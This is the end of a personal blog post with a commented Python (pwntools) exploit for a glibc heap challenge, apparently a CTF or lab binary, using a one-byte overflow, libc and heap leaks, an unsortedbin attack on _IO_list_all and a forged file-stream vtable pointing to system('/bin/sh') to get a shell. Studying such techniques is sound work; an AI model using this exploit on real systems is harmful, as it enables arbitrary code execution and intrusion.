<span class="nb">print</span><span class="p">(</span><span class="s2">"One-byte Overflow"</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="n">A</span><span class="p">,</span> <span class="sa">b</span><span class="s2">"X"</span> <span class="o">*</span> <span class="mh">0x58</span> <span class="o">+</span> <span class="n">p8</span><span class="p">(</span><span class="mh">0xc1</span><span class="p">))</span>

<span class="nb">print</span><span class="p">(</span><span class="s2">"Trigger remainder process"</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="n">B</span><span class="p">)</span> <span class="c1"># Puts the BC fake chunk into the unsortedbin</span>
<span class="n">B</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">()</span> <span class="c1"># B -&gt; [4] -&gt; Triggers the remaindering process so that chunk B is reallocated and chunk C is linked to the unsortedbin</span>

<span class="c1"># Even though the C chunk is freed, the programs still holds the pointer to this chunks (it wasn't freed using the program free() option) so its content can be leaked by calling read(2)</span>

<span class="nb">print</span><span class="p">(</span><span class="s2">"Leak libc @"</span><span class="p">)</span>
<span class="n">raw_leaked</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="sa">b</span><span class="s2">"2"</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()[</span><span class="mi">0</span><span class="p">:</span><span class="mi">8</span><span class="p">]</span>
<span class="n">leaked</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">raw_leaked</span><span class="p">)</span> <span class="c1"># Leaking unsortedbin address</span>


<span class="n">leaked_from_puts_offset</span> <span class="o">=</span> <span class="mh">0x3325d8</span> <span class="c1"># Manually measured: unsortedbin address - puts address</span>

<span class="n">puts_address</span> <span class="o">=</span> <span class="n">leaked</span> <span class="o">-</span> <span class="n">leaked_from_puts_offset</span>
<span class="n">libc_base_addr</span> <span class="o">=</span> <span class="n">puts_address</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">puts</span>

<span class="c1"># or</span>

<span class="c1"># The unsortedbin is placed at &amp;main_arena + 0x58 so: </span>
<span class="c1">#libc_base_addr = leaked - (libc.sym.main_arena + 0x58)</span>


<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_base_addr</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"libc address: 0x</span><span class="si">{</span><span class="n">libc_base_addr</span><span class="si">:</span><span class="s2">02x</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>


<span class="c1"># Perform the House of Orange</span>

<span class="c1">## To achieve a shell execution crafting a vtable hijacking attack, the heap base address is needed</span>
<span class="n">C</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">()</span> <span class="c1"># C -&gt; [5] -&gt; allocate the remainder</span>

<span class="c1">## Put chunk A and chunk C into 0x60 fastbin -&gt;  Chunk C will hold a pointer to chunk A in its fd_pointer</span>
<span class="c1">## Remember, fastbins are LIFO so the last freed chunks is placed into the head of its fastbin</span>
<span class="n">free</span><span class="p">(</span><span class="n">A</span><span class="p">)</span> 
<span class="n">free</span><span class="p">(</span><span class="n">C</span><span class="p">)</span>

<span class="n">raw_leaked</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="sa">b</span><span class="s2">"2"</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()[</span><span class="mi">0</span><span class="p">:</span><span class="mi">8</span><span class="p">]</span>
<span class="n">leaked</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">raw_leaked</span><span class="p">)</span> <span class="c1"># Leaking heap base chunk address</span>

<span class="n">heap_base_address</span> <span class="o">=</span> <span class="n">leaked</span> <span class="c1"># Being A the first chunk, its address is the base of the heap</span>

<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"heap base address: 0x</span><span class="si">{</span><span class="n">heap_base_address</span><span class="si">:</span><span class="s2">02x</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>

<span class="c1"># Prepare the unsortedbin attack targeting the _IO_list_all pointer</span>

<span class="n">io_list_all_pointer</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'_IO_list_all'</span><span class="p">]</span>

<span class="c1">## Re-allocate free chunks to return to the initial state</span>
<span class="n">C</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">()</span> <span class="c1"># C -&gt; [7]</span>
<span class="n">A</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">()</span> <span class="c1"># A -&gt; [8]</span>

<span class="c1">## Another chunk it's needed as room space since a file stream (_IO_FILE_plus) has a size of 0xe0 224 bytes (at least three 0x60 - 96 bytes sized chunks are needed when forging the fake file stream)</span>
<span class="n">E</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">()</span> <span class="c1"># E -&gt; [9]</span>

<span class="n">fd_pointer</span><span class="o">=</span><span class="mh">0xdeadbeef</span>
<span class="n">bk_pointer</span><span class="o">=</span><span class="n">io_list_all_pointer</span> <span class="o">-</span> <span class="mh">0x10</span>

<span class="n">command</span><span class="o">=</span> <span class="sa">b</span><span class="s2">"/bin/sh</span><span class="se">\0</span><span class="s2">"</span>
<span class="n">size</span><span class="o">=</span><span class="mh">0xc1</span>

<span class="c1">## Perform again the remaindering so the C chunk is put into the unsortedbin to be weaponized for the unsortedbin attack</span>
<span class="n">edit</span><span class="p">(</span><span class="n">A</span><span class="p">,</span> <span class="sa">b</span><span class="s2">"X"</span> <span class="o">*</span> <span class="mh">0x58</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">size</span><span class="p">))</span> <span class="c1"># One-byte overflow into chunk B</span>
<span class="n">free</span><span class="p">(</span><span class="n">B</span><span class="p">)</span> 
<span class="n">B</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">()</span> <span class="c1"># B [10] -&gt; Remainder BC chunk again</span>

<span class="c1">## Forge the fake file stream to perform the vtable hijacking attack</span>
<span class="n">write_base</span><span class="o">=</span><span class="mi">1</span>
<span class="n">write_ptr</span><span class="o">=</span><span class="mi">2</span>
<span class="n">mode</span> <span class="o">=</span> <span class="mh">0xffffffff</span>
<span class="n">junk1_size</span> <span class="o">=</span> <span class="mh">0x7</span> <span class="o">*</span> <span class="mh">0x8</span>
<span class="n">junk2_size</span> <span class="o">=</span> <span class="mh">0xa</span> <span class="o">*</span> <span class="mh">0x8</span>
<span class="n">padding</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>


<span class="n">system_address_from_heap_base_offset</span> <span class="o">=</span> <span class="mh">0x190</span> <span class="c1"># Distance of where system address is placed into the fake file stream from the heap base</span>

<span class="c1">## locate the vtable in a position into the heap so that the __overflow overlaps the system address</span>
<span class="n">vtable_ptr</span> <span class="o">=</span> <span class="n">heap_base_address</span> <span class="o">+</span> <span class="n">system_address_from_heap_base_offset</span> <span class="o">-</span> <span class="p">(</span><span class="mh">0x8</span> <span class="o">*</span> <span class="mi">3</span><span class="p">)</span>

<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"vtable pointer: 0x</span><span class="si">{</span><span class="n">vtable_ptr</span><span class="si">:</span><span class="s2">02x</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>

<span class="c1">## After the unsortedbin attack, the _IO_list_all will overlap the main arena: its file._chain attribute will overlap the 0x60 smallbin bk_pointer.</span>
<span class="c1">## When performing the flushing, GLIBC will follow the _chain: write the C chunk address into the smallbin abusing the sorting process</span>
<span class="n">edit</span><span class="p">(</span><span class="n">B</span><span class="p">,</span>
     <span class="sa">b</span><span class="s2">"B"</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x58</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">command</span><span class="p">))</span> <span class="o">+</span> <span class="n">command</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x69</span><span class="p">)</span>
<span class="p">)</span>

<span class="c1">## Perform the unsortedbin attack</span>
<span class="nb">print</span><span class="p">(</span><span class="s2">"Unsortedbin attack!"</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="n">C</span><span class="p">,</span>
     <span class="n">p64</span><span class="p">(</span><span class="n">fd_pointer</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bk_pointer</span><span class="p">)</span> <span class="o">+</span>
     <span class="n">p64</span><span class="p">(</span><span class="n">write_base</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">write_ptr</span><span class="p">)</span> <span class="o">+</span> 
     <span class="sa">b</span><span class="s2">"Y"</span> <span class="o">*</span> <span class="n">junk1_size</span> 
<span class="p">)</span>

<span class="n">edit</span><span class="p">(</span><span class="n">D</span><span class="p">,</span>
     <span class="sa">b</span><span class="s2">"Z"</span> <span class="o">*</span> <span class="n">junk2_size</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">mode</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="p">)</span>

<span class="n">edit</span><span class="p">(</span><span class="n">E</span><span class="p">,</span>
     <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">system</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">vtable_ptr</span><span class="p">)</span>
<span class="p">)</span>

<span class="n">malloc</span><span class="p">()</span>

<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div>
  </div>
  <div class="tag-cloud">
    <p>
    </p>
  </div>






</article>

<footer>
<p>&copy; Jack69 - 2026 </p>
<p>
Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
  <span class="footer-separator">|</span>
  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
  <script id="dark-theme-script"
          src="https://ojack69.github.io/jacks-corner/theme/dark-theme/dark-theme.min.js"
          data-enable-auto-detect-theme="True"
          data-default-theme="dark"
          type="text/javascript">
  </script>
</p></footer>  </main>

<script type="application/ld+json">
{
  "@context" : "http://schema.org",
  "@type" : "Blog",
  "name": " Jack's Corner ",
  "url" : "https://ojack69.github.io/jacks-corner",
  "image": "",
  "description": "My personal notes on stuff I like, nothing special"
}
</script>  <script>
    window.loadStorkIndex = function () {
      stork.initialize("https://ojack69.github.io/jacks-corner/theme/stork/stork.wasm")
      stork.register("sitesearch", "https://ojack69.github.io/jacks-corner/search-index.st", { showProgress: false });
    }
  </script>
  <script src="https://ojack69.github.io/jacks-corner/theme/stork/stork.js"></script>

</body>
</html>